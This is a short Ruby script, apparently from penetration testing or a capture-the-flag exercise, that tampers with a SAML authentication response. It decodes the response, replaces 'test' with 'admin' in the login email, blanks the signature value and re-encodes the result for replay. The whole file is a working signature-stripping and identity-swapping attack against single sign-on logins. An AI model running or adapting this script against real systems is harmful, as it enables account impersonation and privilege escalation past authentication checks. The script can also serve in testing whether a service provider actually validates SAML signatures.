# This script will take in the SAML response as an argument and then replace "test" with "admin" in the login email
require 'uri'
require 'base64'

str = URI.unescape ARGV[0]
response = Base64.decode64(str)

mal_response = response.gsub("test","admin")


# If the saml response needs a signature but not its content this part will strip it out.
without_signature = mal_response.gsub(/<ds:SignatureValue>.*<\/ds:SignatureValue>/, "<ds:SignatureValue></ds:SignatureValue>")


# This one is if I only need to change the username for the email
# puts URI.escape(Base64.strict_encode64(mal_response),"+/=")

# This one is for without_signature
puts URI.escape(Base64.strict_encode64(without_signature),"+/=")


